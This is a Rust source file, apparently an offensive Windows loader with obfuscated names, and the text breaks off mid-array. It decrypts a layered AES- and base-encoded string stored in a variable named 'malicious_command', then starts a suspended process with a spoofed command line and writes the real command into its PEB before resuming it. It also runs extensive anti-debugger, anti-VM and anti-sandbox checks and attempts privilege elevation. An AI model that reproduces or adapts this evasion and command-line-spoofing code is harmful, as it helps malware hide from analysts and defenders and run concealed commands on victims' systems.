# ! [allow (non_snake_case)]
# ! [allow (unused_unsafe)]
mod power;
mod syscalls;
use anti_debug_rust;
use anti_sandbox;
use anti_vm;
use crate::anti_debug_rust::bad_processes;
use crate::anti_debug_rust::blacklisted_windows;
use crate::anti_debug_rust::debugger_detection;
use crate::anti_debug_rust::hooks_detection;
use crate::anti_debug_rust::parent_anti_debug;
use crate::anti_debug_rust::run_debug_checks;
use crate::anti_sandbox::admin_check;
use crate::anti_sandbox::all_tokens;
use crate::anti_sandbox::clean_environment_detection;
use crate::anti_sandbox::critical_process;
use crate::anti_sandbox::internet_check;
use crate::anti_sandbox::pc_uptime;
use crate::anti_sandbox::recent_file_activity;
use crate::anti_sandbox::repetitive_process;
use crate::anti_sandbox::run_environment_checks;
use crate::anti_sandbox::running_processes;
use crate::anti_sandbox::runtime_detector;
use crate::anti_sandbox::usb_check;
use crate::anti_sandbox::username_check;
use crate::anti_vm::anyrun_detection;
use crate::anti_vm::comodo_antivirus_detection;
use crate::anti_vm::deep_freeze_detection;
use crate::anti_vm::hyperv_check;
use crate::anti_vm::kvm_check;
use crate::anti_vm::monitor_metrics;
use crate::anti_vm::parallels_check;
use crate::anti_vm::qemu_check;
use crate::anti_vm::run_vm_checks;
use crate::anti_vm::sandboxie_detection;
use crate::anti_vm::shadow_defender_detection;
use crate::anti_vm::triage_detection;
use crate::anti_vm::virtualbox_detection;
use crate::anti_vm::vm_artifacts;
use crate::anti_vm::vm_platform_check;
use crate::anti_vm::vmware_detection;
use crate::syscalls::SYSCALLS;
use once_cell::sync::Lazy;
use power::run_all_checks;
use std::ffi::c_void;
use std::mem::size_of;
use std::mem::transmute;
use std::mem::zeroed;
use std::ptr::null_mut;
use windows_sys::Win32::Foundation::NTSTATUS;
use windows_sys::Win32::Foundation::UNICODE_STRING;
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
use windows_sys::Win32::System::Threading::CREATE_NEW_CONSOLE;
use windows_sys::Win32::System::Threading::CREATE_SUSPENDED;
use windows_sys::Win32::System::Threading::CreateProcessW;
use windows_sys::Win32::System::Threading::PEB;
use windows_sys::Win32::System::Threading::PROCESS_BASIC_INFORMATION;
use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;
use windows_sys::Win32::System::Threading::PROCESS_INFORMATION_CLASS;
use windows_sys::Win32::System::Threading::STARTUPINFOW;

#[inline(never)]
fn checksum_ugohxiwyakqi(data: &[u8]) -> u64 {
    let mut a = 1u64;
    let mut b = 0u64;
    for &byte in data {
        a = (a.wrapping_add(byte as u64)) % 65521;
        b = (b.wrapping_add(a)) % 65521;
    }
    (b << 32) | a
}

fn decode_nwevfpr_rytds(encrypted: &[u8], key: &[u8], expected_sum: u64) -> &'static str {
    let s: String = {
        use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
        use aes::{Aes128, Aes192, Aes256};
        use base85; // using base85 for base85 decoding
        use bs58; // using bs58 for base58 decoding
        use base64::{engine::general_purpose, Engine as _};

        if key.len() < 88 { return Box::leak(String::from_utf8_lossy(encrypted).to_string().into_boxed_str()); }

        let xor_key = &key[0..16];
        let aes192_key = &key[16..40];
        let aes128_key = &key[40..56];
        let aes256_key = &key[56..88];

        let mut data = encrypted.to_vec();

        let cipher256 = Aes256::new(GenericArray::from_slice(aes256_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher256.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher128 = Aes128::new(GenericArray::from_slice(aes128_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher128.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher192 = Aes192::new(GenericArray::from_slice(aes192_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher192.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        if !data.is_empty() {
            let pad_len = data[data.len() - 1] as usize;
            if pad_len <= 16 && pad_len <= data.len() {
                data.truncate(data.len() - pad_len);
            }
        }

        let xor_decoded: Vec<u8> = data.iter().enumerate().map(|(i, &b)| b ^ xor_key[i % xor_key.len()]).collect();
        let hex_str = match String::from_utf8(xor_decoded) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base64_bytes = match hex::decode(&hex_str) { Ok(b) => b, Err(_) => return Box::leak(hex_str.into_boxed_str()) };
        let base64_str = match String::from_utf8(base64_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base32_bytes = match general_purpose::STANDARD.decode(&base64_str) { Ok(b) => b, Err(_) => return Box::leak(base64_str.into_boxed_str()) };
        let base32_str = match String::from_utf8(base32_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base58_bytes = match base32::decode(base32::Alphabet::Rfc4648 { padding: true }, &base32_str) { Some(b) => b, None => return Box::leak(base32_str.into_boxed_str()) };
        let base58_str = match String::from_utf8(base58_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base85_bytes = match bs58::decode(&base58_str).into_vec() { Ok(b) => b, Err(_) => return Box::leak(base58_str.into_boxed_str()) };
        let base85_str = match String::from_utf8(base85_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base45_bytes = match base85::decode(&base85_str) { Ok(b) => b, Err(_) => return Box::leak(base85_str.into_boxed_str()) };
        let base45_str = match String::from_utf8(base45_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };

        match base45::decode(&base45_str) {
            Ok(final_bytes) => {
                let runtime_sum = checksum_ugohxiwyakqi(&final_bytes);
                if runtime_sum != expected_sum {
                    // Tampering detected! Simulated volatile write (to valid memory) then abort.
                    unsafe {
                        let mut dummy: u8 = 0;
                        std::ptr::write_volatile(&mut dummy, 1);
                    }
                    std::process::abort();
                }
                String::from_utf8_lossy(&final_bytes).to_string()
            },
            Err(_) => base45_str,
        }
    };
    Box::leak(s.into_boxed_str())
}

        fn sgwahk_v_m (s : & str) -> Vec < u16 > { s . encode_utf16 () . collect () } fn ge_xi_cudc (s : & str , total_width : usize , padding_char : u16) -> Vec < u16 > { let mut wide = sgwahk_v_m (s) ; if wide . len () < total_width { wide . resize (total_width , padding_char) ; } wide } fn dyksrqsh () { if j_zib_tvza () { println ! ("ikinci de calisti vay anasini") ; } let malicious_command = decode_nwevfpr_rytds (& [77 , 117 , 83 , 98 , 70 , 139 , 135 , 207 , 132 , 172 , 170 , 51 , 40 , 89 , 0 , 179 , 185 , 230 , 242 , 176 , 109 , 111 , 173 , 18 , 159 , 241 , 178 , 31 , 42 , 134 , 113 , 136 , 241 , 144 , 217 , 143 , 153 , 37 , 131 , 208 , 78 , 117 , 136 , 181 , 161 , 53 , 44 , 105 , 11 , 114 , 148 , 252 , 254 , 204 , 48 , 18 , 83 , 63 , 127 , 254 , 245 , 224 , 118 , 153 , 222 , 145 , 10 , 168 , 13 , 138 , 199 , 87 , 30 , 188 , 94 , 125 , 26 , 202 , 9 , 249 , 131 , 247 , 94 , 63 , 209 , 148 , 231 , 151 , 149 , 197 , 148 , 25 , 133 , 58 , 244 , 236 , 152 , 114 , 205 , 5 , 122 , 76 , 235 , 179 , 202 , 172 , 64 , 228 , 65 , 233 , 45 , 94 , 139 , 80 , 134 , 146 , 3 , 168 , 236 , 142 , 131 , 97 , 110 , 95 , 213 , 112 , 138 , 107 , 242 , 220 , 191 , 39 , 112 , 87 , 31 , 103 , 17 , 103 , 158 , 128 , 173 , 227 , 250 , 118 , 188 , 25 , 1 , 78 , 228 , 193 , 12 , 64 , 163 , 57 , 163 , 114 , 7 , 148 , 59 , 199 , 183 , 16 , 91 , 91 , 81 , 227 , 119 , 127 , 7 , 114 , 167 , 228 , 237 , 163 , 81 , 96 , 217 , 134 , 61 , 145 , 64 , 108 , 245 , 126 , 30 , 181 , 178 , 16 , 26 , 49 , 72 , 176 , 75 , 115 , 23 , 79 , 118 , 234 , 102 , 130 , 109 , 4 , 167 , 137 , 213 , 35 , 57 , 230 , 71 , 89 , 37 , 188 , 253 , 70 , 252 , 200 , 174 , 126 , 194 , 34 , 133 , 56 , 81 , 17 , 226 , 172 , 196 , 2 , 204 , 197 , 24 , 111 , 118 , 7 , 181 , 189 , 95 , 90 , 226 , 164 , 196 , 55 , 118 , 159 , 142 , 102 , 96 , 236 , 13 , 151 , 245 , 249 , 149 , 30 , 12 , 61 , 132 , 107 , 3 , 218 , 217 , 224 , 235 , 137 , 91 , 109 , 52 , 27 , 121 , 233 , 169 , 93 , 22 , 79 , 140 , 169 , 137 , 31 , 139 , 236 , 222 , 155 , 199 , 228 , 178 , 176 , 47 , 16 , 65 , 38 , 232 , 199 , 125 , 161 , 197 , 126 , 39 , 57 , 205 , 154 , 166 , 131 , 208 , 141 , 127 , 210 , 213 , 79 , 170 , 211 , 54 , 244 , 32 , 81 , 102 , 109 , 253 , 96 , 57 , 85 , 89 , 67 , 121 , 87 , 50 , 74 , 101 , 177 , 181 , 125 , 61 , 163 , 15 , 249 , 130 , 36 , 38 , 165 , 198 , 67 , 77 , 178 , 98 , 45 , 9 , 128 , 48 , 0 , 223 , 28 , 208 , 242 , 121 , 151 , 247 , 34 , 10 , 139 , 129 , 98 , 163 , 120 , 223 , 106 , 29 , 5 , 243 , 60 , 222 , 238 , 62 , 19 , 235 , 246 , 221 , 57 , 89 , 226 , 98 , 130 , 131 , 60 , 95 , 180 , 119 , 80 , 157 , 116 , 91 , 80 , 186 , 65 , 218 , 176 , 23 , 128 , 99 , 186 , 73 , 93 , 4 , 127 , 71 , 161 , 91 , 100 , 103 , 216 , 143 , 11 , 1 , 52 , 116 , 162 , 73 , 1 , 201 , 195 , 141 , 71 , 176 , 236 , 2 , 75 , 183 , 145 , 95 , 31 , 115 , 6 , 125 , 215 , 176 , 133 , 33 , 213 , 200 , 77 , 170 , 170 , 102 , 231 , 44 , 197 , 188 , 56 , 132 , 109 , 241 , 230 , 24 , 225 , 0 , 115 , 236 , 162 , 82 , 208 , 52 , 152 , 32 , 69 , 51 , 76 , 217 , 121 , 205 , 26 , 160 , 135 , 83 , 155 , 119 , 136 , 27 , 20 , 84 , 145 , 238 , 230 , 91 , 72 , 114 , 60 , 99 , 204 , 65 , 110 , 90 , 20 , 156 , 53 , 17 , 140 , 63 , 59 , 130 , 207 , 253 , 241 , 29 , 181 , 39 , 33 , 64 , 103 , 66 , 242 , 25 , 34 , 23 , 164 , 106 , 16 , 156 , 109 , 111 , 227 , 1 , 190 , 149 , 143 , 67 , 152 , 60 , 111 , 200 , 98 , 170 , 197 , 86 , 186 , 217 , 131 , 72 , 89 , 197 , 176 , 217 , 1 , 232 , 189 , 187 , 190 , 82 , 63 , 240 , 160 , 63 , 75 , 111 , 198 , 193 , 44 , 231 , 181 , 121 , 14 , 53 , 122 , 74 , 14 , 16 , 80 , 101 , 40 , 63 , 211 , 226 , 208 , 90 , 97 , 234 , 145 , 134 , 57 , 82 , 19 , 43 , 60 , 131 , 219 , 223 , 221 , 118 , 237 , 9 , 167 , 23 , 11 , 40 , 20 , 42 , 130 , 227 , 28 , 149 , 177 , 90 , 210 , 21 , 105 , 213 , 118 , 184 , 23 , 94 , 203 , 240 , 118 , 171 , 159 , 7 , 187 , 112 , 75 , 52 , 139 , 75 , 98 , 152 , 32 , 59 , 44 , 246 , 166 , 20 , 84 , 49 , 26 , 131 , 155 , 111 , 137 , 40 , 227 , 254 , 254 , 119 , 154 , 226 , 234 , 69 , 188 , 64 , 230 , 140 , 45 , 170 , 19 , 164 , 60 , 178 , 20 , 12 , 127] , & [56 , 72 , 126 , 7 , 142 , 88 , 202 , 178 , 130 , 108 , 98 , 143 , 129 , 198 , 227 , 208 , 104 , 18 , 221 , 159 , 197 , 12 , 249 , 196 , 144 , 216 , 83 , 75 , 121 , 168 , 94 , 67 , 151 , 171 , 24 , 152 , 199 , 64 , 80 , 17 , 161 , 124 , 86 , 248 , 51 , 43 , 217 , 231 , 70 , 235 , 188 , 204 , 169 , 18 , 160 , 63 , 7 , 87 , 226 , 136 , 228 , 63 , 126 , 62 , 239 , 146 , 163 , 47 , 1 , 66 , 14 , 172 , 208 , 192 , 201 , 68 , 208 , 255 , 164 , 93 , 226 , 82 , 4 , 84 , 138 , 187 , 215 , 14] , 129132486726932u64) ; let malicious_command_wide = sgwahk_v_m (& malicious_command) ; let spoofed_command_str = decode_nwevfpr_rytds (& [209 , 6 , 207 , 214 , 44 , 106 , 168 , 81 , 5 , 182 , 7 , 199 , 50 , 112 , 148 , 226 , 113 , 168 , 42 , 170 , 30 , 121 , 1 , 96 , 220 , 188 , 20 , 72 , 44 , 44 , 62 , 30 , 180 , 138 , 188 , 119 , 123 , 103 , 111 , 209 , 21 , 244 , 56 , 253 , 139 , 170 , 183 , 54 , 28 , 76 , 101 , 175 , 223 , 199 , 152 , 204 , 106 , 48 , 19 , 18 , 254 , 202 , 121 , 46 , 167 , 17 , 169 , 90 , 197 , 219 , 1 , 168 , 126 , 129 , 130 , 230 , 39 , 80 , 229 , 141 , 56 , 67 , 180 , 78 , 51 , 228 , 137 , 122 , 196 , 136 , 32 , 137 , 238 , 225 , 249 , 159 , 148 , 78 , 146 , 126 , 160 , 2 , 139 , 238 , 186 , 199 , 17 , 207 , 191 , 139 , 220 , 240 , 232 , 47 , 155 , 65 , 16 , 23 , 24 , 77 , 201 , 184 , 183 , 99 , 130 , 191 , 153 , 18 , 179 , 240 , 229 , 65 , 172 , 53 , 1 , 38 , 208 , 36 , 239 , 164 , 160 , 94 , 46 , 79 , 139 , 238 , 251 , 154 , 85 , 128 , 121 , 149 , 50 , 26 , 194 , 255 , 221 , 144 , 90 , 64 , 6 , 211 , 222 , 216 , 112 , 164 , 11 , 183 , 51 , 17 , 80 , 241 , 250 , 37 , 110 , 4 , 244 , 134 , 80 , 84 , 32 , 213 , 103 , 34 , 186 , 238 , 220 , 128 , 92 , 244 , 205 , 194] , & [204 , 235 , 227 , 221 , 73 , 0 , 96 , 173 , 106 , 40 , 116 , 245 , 165 , 32 , 81 , 134 , 224 , 145 , 229 , 240 , 17 , 205 , 228 , 253 , 161 , 159 , 109 , 94 , 130 , 90 , 145 , 246 , 132 , 203 , 43 , 99 , 56 , 60 , 165 , 151 , 253 , 39 , 236 , 96 , 141 , 23 , 118 , 115 , 50 , 173 , 19 , 248 , 221 , 242 , 240 , 12 , 30 , 114 , 33 , 57 , 15 , 194 , 4 , 21 , 91 , 3 , 58 , 117 , 251 , 175 , 37 , 38 , 131 , 165 , 26 , 252 , 191 , 122 , 95 , 138 , 245 , 232 , 234 , 85 , 214 , 0 , 86 , 222] , 48507360642486u64) ; let mut spoofed_command_wide = ge_xi_cudc (spoofed_command_str , malicious_command . len () , ' ' as u16) ; spoofed_command_wide . push (0) ; let mut si : STARTUPINFOW = unsafe { zeroed () } ; si . cb = size_of :: < STARTUPINFOW > () as u32 ; let mut sa : SECURITY_ATTRIBUTES = unsafe { zeroed () } ; sa . nLength = size_of :: < SECURITY_ATTRIBUTES > () as u32 ; let mut pi : PROCESS_INFORMATION = unsafe { zeroed () } ; let mut current_dir = sgwahk_v_m (decode_nwevfpr_rytds (& [136 , 70 , 6 , 166 , 81 , 3 , 80 , 143 , 205 , 215 , 138 , 83 , 2 , 143 , 149 , 120 , 10 , 75 , 40 , 51 , 111 , 174 , 54 , 133 , 187 , 16 , 210 , 237 , 7 , 123 , 33 , 92 , 17 , 64 , 249 , 153 , 120 , 225 , 4 , 0 , 230 , 27 , 71 , 69 , 17 , 134 , 40 , 147 , 167 , 150 , 54 , 173 , 178 , 182 , 137 , 32 , 161 , 143 , 95 , 52 , 218 , 146 , 240 , 189 , 37 , 7 , 214 , 255 , 227 , 53 , 101 , 92 , 16 , 254 , 130 , 117 , 177 , 70 , 222 , 30 , 68 , 83 , 33 , 167 , 148 , 185 , 95 , 141 , 228 , 143 , 253 , 180 , 66 , 177 , 16 , 203 , 221 , 125 , 130 , 249 , 231 , 217 , 102 , 6 , 109 , 210 , 53 , 8 , 152 , 248 , 213 , 227 , 13 , 11 , 118 , 250 , 197 , 53 , 102 , 35 , 169 , 102 , 23 , 180 , 104 , 222 , 129 , 172 , 174 , 28 , 85 , 80 , 109 , 46 , 7 , 113 , 50 , 140 , 216 , 197 , 55 , 32 , 157 , 177] , & [207 , 26 , 70 , 219 , 52 , 172 , 191 , 189 , 128 , 7 , 253 , 255 , 123 , 67 , 232 , 76 , 77 , 76 , 66 , 231 , 121 , 93 , 147 , 231 , 158 , 90 , 182 , 2 , 56 , 72 , 136 , 163 , 171 , 87 , 164 , 131 , 183 , 196 , 21 , 113 , 252 , 224 , 229 , 106 , 224 , 116 , 193 , 84 , 61 , 147 , 109 , 168 , 137 , 203 , 126 , 13 , 228 , 9 , 100 , 160 , 84 , 191 , 231 , 91 , 156 , 196 , 49 , 222 , 146 , 165 , 196 , 40 , 0 , 137 , 151 , 71 , 67 , 206 , 233 , 183 , 72 , 218 , 58 , 212 , 51 , 174 , 95 , 81] , 26310969656385u64)) ; current_dir . push (0) ; let success = unsafe { CreateProcessW (null_mut () , spoofed_command_wide . as_mut_ptr () , & mut sa , & mut sa , 0 , CREATE_SUSPENDED | CREATE_NEW_CONSOLE , null_mut () , current_dir . as_ptr () , & mut si , & mut pi ,) } ; if success == 0 { return ; } let mut pbi : PROCESS_BASIC_INFORMATION = unsafe { zeroed () } ; let mut return_length : u32 = 0 ; let status : NTSTATUS = (jp_aqhg_at . NtQueryInformationProcess) (pi . hProcess as * mut c_void , 0 as PROCESS_INFORMATION_CLASS , & mut pbi as * mut _ as * mut c_void , size_of :: < PROCESS_BASIC_INFORMATION > () as u32 , & mut return_length) ; if status != 0 { unsafe { let _ = (jp_aqhg_at . NtClose) (pi . hProcess as * mut c_void) ; let _ = (jp_aqhg_at . NtClose) (pi . hThread as * mut c_void) ; } return ; } let mut peb : PEB = unsafe { zeroed () } ; let mut bytes_read : usize = 0 ; let status = unsafe { (jp_aqhg_at . NtReadVirtualMemory) (pi . hProcess as * mut c_void , pbi . PebBaseAddress as * mut c_void , & mut peb as * mut _ as * mut c_void , size_of :: < PEB > () , & mut bytes_read) } ; if status != 0 || bytes_read != size_of :: < PEB > () { unsafe { let _ = (jp_aqhg_at . NtClose) (pi . hProcess as * mut c_void) ; let _ = (jp_aqhg_at . NtClose) (pi . hThread as * mut c_void) ; } return ; } # [repr (C)] struct Params { _filler : [u8 ; (5 + 107)] , CommandLine : UNICODE_STRING , } let mut proc_params : Params = unsafe { zeroed () } ; let status = unsafe { (jp_aqhg_at . NtReadVirtualMemory) (pi . hProcess as * mut c_void , peb . ProcessParameters as * mut c_void , & mut proc_params as * mut _ as * mut c_void , size_of :: < Params > () , & mut bytes_read) } ; if status != 0 || bytes_read != size_of :: < Params > () { unsafe { let _ = (jp_aqhg_at . NtClose) (pi . hProcess as * mut c_void) ; let _ = (jp_aqhg_at . NtClose) (pi . hThread as * mut c_void) ; } return ; } let mut bytes_written : usize = 0 ; let status = unsafe { (jp_aqhg_at . NtWriteVirtualMemory) (pi . hProcess as * mut c_void , proc_params . CommandLine . Buffer as * mut c_void , malicious_command_wide . as_ptr () as * mut c_void , malicious_command_wide . len () * 2 , & mut bytes_written) } ; if status != 0 { unsafe { let _ = (jp_aqhg_at . NtClose) (pi . hProcess as * mut c_void) ; let _ = (jp_aqhg_at . NtClose) (pi . hThread as * mut c_void) ; } return ; } let cmd_line_len = (spoofed_command_str . len () * 2) as u16 ; let status = unsafe { let len_address = (peb . ProcessParameters as * mut u8) . add ((36 + 76)) ; (jp_aqhg_at . NtWriteVirtualMemory) (pi . hProcess as * mut c_void , len_address as * mut c_void , & cmd_line_len as * const _ as * mut c_void , size_of :: < u16 > () , & mut bytes_written) } ; if status != 0 { unsafe { let _ = (jp_aqhg_at . NtClose) (pi . hProcess as * mut c_void) ; let _ = (jp_aqhg_at . NtClose) (pi . hThread as * mut c_void) ; } return ; } unsafe { let mut suspend_count : u32 = 0 ; let _ = (jp_aqhg_at . NtResumeThread) (pi . hThread as * mut c_void , & mut suspend_count) ; let _ = (jp_aqhg_at . NtClose) (pi . hProcess as * mut c_void) ; let _ = (jp_aqhg_at . NtClose) (pi . hThread as * mut c_void) ; } }          pub fn awfcygti () -> bool { if ! runtime_detector :: is_windows () { return false ; } if ! admin_check :: is_admin () { if let Err (_) = admin_check :: elevate_process () { } } if admin_check :: is_admin () { let _ = all_tokens :: enable () ; } j_zib_tvza () } pub fn oh_mgzkyw () -> bool { if ! runtime_detector :: is_windows () { return false ; } if run_debug_checks () { return true ; } if run_vm_checks () { return true ; } if run_environment_checks () { return true ; } if thpreor_j () { return true ; } false } pub fn j_zib_tvza () -> bool { if debugger_detection :: is_debugger_present () { println ! ("[anti_debug_rust] debugger_detection::is_debugger_present") ; return true ; } if debugger_detection :: check_remote_debugger () . unwrap_or (false) { println ! ("[anti_debug_rust] debugger_detection::check_remote_debugger") ; return true ; } if parent_anti_debug :: parent_anti_debug () { println ! ("[anti_debug_rust] parent_anti_debug::parent_anti_debug") ; return true ; } if pc_uptime :: check_uptime ((200 + 400)) . unwrap_or (false) { println ! ("[anti_sandbox] pc_uptime::check_uptime") ; return true ; } if bad_processes :: detect () . unwrap_or (false) { println ! ("[anti_debug_rust] bad_processes::detect") ; return true ; } if running_processes :: check_running_processes_count ((5 + 45)) . unwrap_or (false) { println ! ("[anti_sandbox] running_processes::check_running_processes_count") ; return true ; } if blacklisted_windows :: check_blacklisted_windows () { println ! ("[anti_debug_rust] blacklisted_windows::check_blacklisted_windows") ; return true ; } if hooks_detection :: detect_hooks_on_common_winapi_functions (None , None) { println ! ("[anti_debug_rust] hooks_detection::detect_hooks_on_common_winapi_functions") ; return true ; } if shadow_defender_detection :: detect_shadow_defender () { println ! ("[anti_vm] shadow_defender_detection::detect_shadow_defender") ; return true ; } if anyrun_detection :: anyrun_detection () . unwrap_or (false) { println ! ("[anti_sandbox] anyrun_detection::anyrun_detection") ; return true ; } if ! clean_environment_detection :: detect_clean_environment () { println ! ("[anti_sandbox] clean_environment_detection::detect_clean_environment (too clean)") ; return true ; } if comodo_antivirus_detection :: detect_comodo_antivirus () { println ! ("[anti_sandbox] comodo_antivirus_detection::detect_comodo_antivirus") ; return true ; } if deep_freeze_detection :: detect_deep_freeze () { println ! ("[anti_vm] deep_freeze_detection::detect_deep_freeze") ; return true ; } if hyperv_check :: detect_hyperv () . unwrap_or (false) { println ! ("[anti_vm] hyperv_check::detect_hyperv") ; return true ; } if kvm_check :: check_for_kvm () . unwrap_or (false) { println ! ("[anti_vm] kvm_check::check_for_kvm") ; return true ; } if monitor_metrics :: is_screen_small () . unwrap_or (false) { println ! ("[anti_sandbox] monitor_metrics::is_screen_small") ; return true ; } if parallels_check :: check_for_parallels () . unwrap_or (false) { println ! ("[anti_vm] parallels_check::check_for_parallels") ; return true ; } if qemu_check :: check_for_qemu () . unwrap_or (false) { println ! ("[anti_vm] qemu_check::check_for_qemu") ; return true ; } if recent_file_activity :: recent_file_activity_check () . unwrap_or (false) { println ! ("[anti_sandbox] recent_file_activity::recent_file_activity_check") ; return true ; } if repetitive_process :: check () . unwrap_or (false) { println ! ("[anti_sandbox] repetitive_process::check") ; return true ; } if sandboxie_detection :: detect_sandboxie () { println ! ("[anti_sandbox] sandboxie_detection::detect_sandboxie") ; return true ; } if triage_detection :: triage_check () . unwrap_or (false) { println ! ("[anti_sandbox] triage_detection::triage_check") ; return true ; } if usb_check :: plugged_in () . unwrap_or (true) == false { println ! ("[anti_sandbox] usb_check::plugged_in (no USB devices)") ; return true ; } if username_check :: check_for_blacklisted_names () { println ! ("[anti_sandbox] username_check::check_for_blacklisted_names") ; return true ; } if virtualbox_detection :: graphics_card_check () . unwrap_or (false) { println ! ("[anti_vm] virtualbox_detection::graphics_card_check") ; return true ; } if vm_artifacts :: vm_artifacts_detect () { println ! ("[anti_vm] vm_artifacts::vm_artifacts_detect") ; return true ; } if vm_platform_check :: detect_vm_platform () . unwrap_or (false) { println ! ("[anti_vm] vm_platform_check::detect_vm_platform") ; return true ; } if vmware_detection :: graphics_card_check () . unwrap_or (false) { println ! ("[anti_vm] vmware_detection::graphics_card_check") ; return true ; } if internet_check :: check_connection () . unwrap_or (true) == false { println ! ("[anti_sandbox] internet_check::check_connection") ; return true ; } false } pub fn thpreor_j () -> bool { bad_processes :: detect () . unwrap_or (false) || blacklisted_windows :: check_blacklisted_windows () } pub struct ahsjvpwq { pub enable_debug_checks : bool , pub enable_vm_checks : bool , pub enable_environment_checks : bool , pub enable_process_checks : bool , pub min_uptime_seconds : u32 , pub min_process_count : usize , pub min_installed_programs : usize , pub enable_internet_check : bool , pub enable_usb_check : bool , pub enable_admin_escalation : bool , pub enable_privilege_escalation : bool , pub enable_critical_process : bool , } impl Default for ahsjvpwq { fn default () -> Self { Self { enable_debug_checks : true , enable_vm_checks : true , enable_environment_checks : true , enable_process_checks : true , min_uptime_seconds : (80 + 520) , min_process_count : (10 + 40) , min_installed_programs : 10 , enable_internet_check : true , enable_usb_check : true , enable_admin_escalation : true , enable_privilege_escalation : true , enable_critical_process : true , } } } # [cfg (test)] mod tests { # [test] fn zm_npordv () { println ! ("Detected OS: {:?}" , runtime_detector :: detect_os ()) ; assert_eq ! (runtime_detector :: is_windows () , cfg ! (windows)) ; } # [test] fn khisxylx () { println ! ("Running as admin: {}" , admin_check :: is_admin ()) ; } # [test] fn lahnmziq () { println ! ("Debugger present: {}" , debugger_detection :: is_debugger_present ()) ; } # [test] fn nipfu_rf_u () { if let Ok (result) = debugger_detection :: check_remote_debugger () { println ! ("Remote debugger present: {}" , result) ; } } # [test] fn ctypt_lk_r () { println ! ("Suspicious parent process: {}" , parent_anti_debug :: parent_anti_debug ()) ; } # [test] fn q_f_wgzswz () { if let Ok (uptime) = pc_uptime :: get_uptime_in_seconds () { println ! ("System uptime: {} seconds" , uptime) ; } } # [test] fn qohjhlhu () { if let Ok (count) = running_processes :: get_running_processes_count () { println ! ("Running processes: {}" , count) ; } } # [test] fn gbxo_ya_hg () { if let Ok (result) = bad_processes :: detect () { println ! ("Bad processes detected: {}" , result) ; } } # [test] fn inrlsdhn () { println ! ("VM environment detected: {}" , run_vm_checks ()) ; } # [test] fn wdusjtfc () { println ! ("Suspicious environment detected: {}" , run_environment_checks ()) ; } # [test] fn zbrxpn_x_w () { if let Ok (connected) = internet_check :: check_connection () { println ! ("Internet connection available: {}" , connected) ; } } # [test] fn mzfh_jm_ne () { if let Ok (small_screen) = monitor_metrics :: is_screen_small () { println ! ("Small screen detected: {}" , small_screen) ; } } # [test] fn kitlabqa () { println ! ("Blacklisted username: {}" , username_check :: check_for_blacklisted_names ()) ; } # [test] fn wqh_b_wnwb () { if let Ok (usb_detected) = usb_check :: plugged_in () { println ! ("USB devices detected: {}" , usb_detected) ; } } # [test] fn fnzjb_rfu () { println ! ("Clean environment (10+ programs): {}" , clean_environment_detection :: detect_clean_environment ()) ; } # [test] fn oysymi_a_f () { if admin_check :: is_admin () { match all_tokens :: enable () { Ok (_) => println ! ("Successfully enabled all available privileges") , Err (e) => println ! ("Failed to enable privileges: {}" , e) , } } else { println ! ("Not running as admin, cannot test privilege escalation") ; } } # [test] fn ksmniqkw () { let detected = j_zib_tvza () ; println ! ("Anti-analysis measures detected: {}" , detected) ; println ! ("Debug checks: {}" , run_debug_checks ()) ; println ! ("VM checks: {}" , run_vm_checks ()) ; println ! ("Environment checks: {}" , run_environment_checks ()) ; println ! ("Process checks: {}" , run_process_checks ()) ; } # [test] fn kusbbsid () { if runtime_detector :: is_windows () { let detected = oh_mgzkyw () ; println ! ("Windows-specific checks detected threats: {}" , detected) ; } else { println ! ("Not running on Windows, skipping Windows-specific tests") ; } } }      type NtQueryInformationProcess = extern "system" fn (ProcessHandle : * mut c_void , ProcessInformationClass : PROCESS_INFORMATION_CLASS , ProcessInformation : * mut c_void , ProcessInformationLength : u32 , ReturnLength : * mut u32 ,) -> i32 ; type NtClose = extern "system" fn (Handle : * mut c_void) -> i32 ; type NtReadVirtualMemory = extern "system" fn (ProcessHandle : * mut c_void , BaseAddress : * mut c_void , Buffer : * mut c_void , NumberOfBytesToRead : usize , NumberOfBytesRead : * mut usize ,) -> i32 ; type NtWriteVirtualMemory = extern "system" fn (ProcessHandle : * mut c_void , BaseAddress : * mut c_void , Buffer : * mut c_void , NumberOfBytesToWrite : usize , NumberOfBytesWritten : * mut usize ,) -> i32 ; type NtResumeThread = extern "system" fn (ThreadHandle : * mut c_void , SuspendCount : * mut u32 ,) -> i32 ; # [derive (Clone)] pub struct Syscalls { pub NtQueryInformationProcess : NtQueryInformationProcess , pub NtClose : NtClose , pub NtReadVirtualMemory : NtReadVirtualMemory , pub NtWriteVirtualMemory : NtWriteVirtualMemory , pub NtResumeThread : NtResumeThread , } impl Syscalls { fn new () -> Result < Self , & 'static str > { unsafe { let ntdll = LoadLibraryA (decode_nwevfpr_rytds (& [225 , 211 , 109 , 228 , 225 , 106 , 202 , 142 , 203 , 129 , 21 , 157 , 180 , 233 , 36 , 238 , 229 , 51 , 205 , 55 , 127 , 27 , 201 , 204 , 194 , 250 , 188 , 155 , 103 , 187 , 232 , 103 , 80 , 114 , 224 , 225 , 228 , 123 , 166 , 59 , 91 , 80 , 99 , 155 , 186 , 234 , 79 , 208 , 4 , 153 , 16 , 94 , 137 , 250 , 23 , 191 , 91 , 240 , 154 , 189 , 171 , 63 , 193 , 6 , 100 , 7 , 147 , 152 , 98 , 250 , 3 , 18 , 22 , 83 , 165 , 161 , 245 , 82 , 27 , 117 , 217 , 187 , 109 , 121 , 193 , 